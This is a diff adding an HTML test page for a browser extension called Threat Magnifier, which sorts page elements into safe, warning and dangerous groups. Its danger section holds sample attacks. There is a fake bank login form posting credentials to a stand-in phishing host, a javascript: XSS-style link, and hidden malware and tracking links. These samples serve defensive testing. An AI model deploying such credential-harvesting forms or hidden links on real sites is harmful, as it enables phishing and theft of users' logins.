@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Magnifier Testing Grounds</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f7fa;
+        }
+
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+
+        .section {
+            background: white;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        h2 {
+            color: #34495e;
+            margin-top: 0;
+        }
+
+        .safe-demo {
+            border-left: 5px solid #2ecc71;
+        }
+
+        .warning-demo {
+            border-left: 5px solid #f39c12;
+        }
+
+        .danger-demo {
+            border-left: 5px solid #e74c3c;
+        }
+
+        /* Some basic styling for elements within sections */
+        input[type="text"],
+        input[type="password"] {
+            padding: 8px;
+            margin: 5px 0 15px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        button[type="submit"] {
+            background-color: #3498db;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #2980b9;
+        }
+
+        iframe {
+            width: 100%;
+            height: 150px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: #eee;
+        }
+
+        .hidden-link {
+            display: none;
+        }
+
+        .invisible-link {
+            visibility: hidden;
+        }
+    </style>
+</head>
+
+<body>
+
+    <h1>🔍 Threat Magnifier Testing Grounds</h1>
+    <p>Use your Threat Magnifier extension on this page to see how it identifies various safe, suspicious, and dangerous
+        elements.</p>
+
+    <!-- SECTION 1: SAFE ELEMENTS -->
+    <div class="section safe-demo">
+        <h2>✅ Safe Elements</h2>
+        <p>These elements follow standard web practices and should be marked <strong
+                style="color: #4CAF50;">SAFE</strong>.</p>
+
+        <p>Here is a standard internal <a href="/about.html">Relative Link</a>.</p>
+
+        <form action="/login" method="POST">
+            <label for="safe-username">Username:</label>
+            <input type="text" id="safe-username" name="username">
+
+            <label for="safe-password">Password:</label>
+            <!-- Even though it's a password, if served over HTTPS it would be fine.
+                 Since this is testing locally, your extension might flag it if it checks protocol. 
+                 But let's assume secure context for the sake of demo organization. -->
+            <input type="password" id="safe-password" name="password">
+
+            <button type="submit">Secure Login</button>
+        </form>
+    </div>
+
+    <!-- SECTION 2: WARNING ELEMENTS -->
+    <div class="section warning-demo">
+        <h2>⚠️ Warning Elements</h2>
+        <p>These elements are slightly suspicious or poorly configured and should be marked <strong
+                style="color: #FFC107;">WARNING</strong>.</p>
+
+        <p>Here is a link to an <a href="http://example.com" target="_blank">External HTTP site</a>.</p>
+        <p>Here is another <a href="https://example.org" target="_blank">External HTTPS site</a>.</p>
+
+        <p>Embedded Content (iFrames often hide ads or trackers):</p>
+        <iframe src="about:blank" title="Empty Test iFrame"></iframe>
+    </div>
+
+    <!-- SECTION 3: DANGEROUS ELEMENTS -->
+    <div class="section danger-demo">
+        <h2>🚨 Dangerous Elements</h2>
+        <p>These elements represent common phishing or attack vectors and should be marked <strong
+                style="color: #F44336;">DANGER</strong>.</p>
+
+        <form action="http://evil-phishing-site.com/steal-data" method="POST">
+            <p><strong>Fake Login Form submitting to external HTTP site:</strong></p>
+            <label for="danger-username">Bank Username:</label>
+            <input type="text" id="danger-username" name="userid">
+            <label for="danger-password">Bank Password:</label>
+            <input type="password" id="danger-password" name="pin">
+            <button type="submit">Verify Account</button>
+        </form>
+
+        <p><strong>Malicious Links:</strong></p>
+        <ul>
+            <li><a href="javascript:alert('XSS Attack Execution!');">Click for Free Prize! (Executes JavaScript)</a>
+            </li>
+            <li>
+                <p>There is a hidden link right here 👉<a href="http://malware.com" class="hidden-link">Invisible
+                        malware link</a>👈 you can't see it, but it might overlap with something!</p>
+            </li>
+            <li>
+                <p>And another one here 👉<a href="http://tracking.com" class="invisible-link">Hidden tracking
+                        link</a>👈</p>
+            </li>
+        </ul>
+    </div>
+
+</body>
+
+</html>
